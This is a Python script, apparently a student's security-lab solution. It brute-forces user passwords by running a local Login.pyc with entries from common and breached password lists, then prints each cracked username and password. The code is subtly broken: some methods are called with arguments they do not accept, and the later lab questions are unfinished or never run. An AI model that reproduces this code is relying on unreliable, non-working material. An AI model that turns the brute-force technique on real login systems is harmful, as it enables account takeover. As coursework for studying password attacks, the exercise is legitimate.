import subprocess

class SkeletonKey:
    ''' 
    Skeleton Key is an object designed to adapt to each questions' parameters and search for users' password(s).

    __init__
    params:
        user_file_path
        passwd_file_path 
        users 
        exe_path

    
    '''
    def __init__(self, user_file_path=None, passwd_file_path=None, users=None, exe_path=None, cracked_users=None):
        self.user_file_path = user_file_path
        self.passwd_file_path = passwd_file_path
        self.exe_path = exe_path
        self.cracked_users = cracked_users if cracked_users else set()
        self.users = self.compile_file_to_list(user_file_path, cracked_users) if user_file_path else list([users])
    
    def compile_file_to_list(self, file_path):
        compiled_list = []
        with open(file_path, "r") as file:
            for row in file:
                item = row.strip()
                if item not in self.cracked_users:
                    compiled_list.append(item)
        
        return compiled_list

    def crack_pass_bruteforce(self, max_cracked=float('inf')):
        cracked = 0

        for user in self.users:
            with open(self.passwd_file_path, "r") as file:
                for passwd in file:
                    passwd = passwd.strip()
                    run = subprocess.run(["python3", self.exe_path, user, passwd], capture_output=True, text=True)
                    if run.stdout == "Login successful.\n":
                        print(f"""Cracked!
                        Username:{user}
                        Password:{passwd}\n""")
                        
                        cracked += 1
                        if cracked >= max_cracked: return
       
if __name__ == '__main__':
    ###########################################
    ##########          Q1          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q1/MostCommonPWs",   # passwd path
        "SkyRedFalcon914",                   # users
        "/home/cse/Lab1/Q1/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      users = test_param[1],
                      exe_path = test_param[2])
    
    key.crack_pass_bruteforce(users=key.users, passwd_file_path=key.passwd_file_path, exe_path=key.exe_path)



    ###########################################
    ##########          Q2          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q2/MostCommonPWs",   # passwd path
        "/home/cse/Lab1/Q2/gang",            # user path
        "/home/cse/Lab1/Q2/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2])

    key.crack_pass_bruteforce(users=key.users, passwd_file_path=key.passwd_file_path, exe_path=key.exe_path)

    ###########################################
    ##########          Q3          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q3/PwnedPWs100k",   # passwd path
        "/home/cse/Lab1/Q3/gang",            # user path
        "/home/cse/Lab1/Q3/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=set(["SkyRedFalcon914", "MontainBlueFalcon157"]))



    ###########################################
    ##########          Q4          ###########
    ###########################################



    ###########################################
    ##########          Q5          ###########
    ###########################################
            
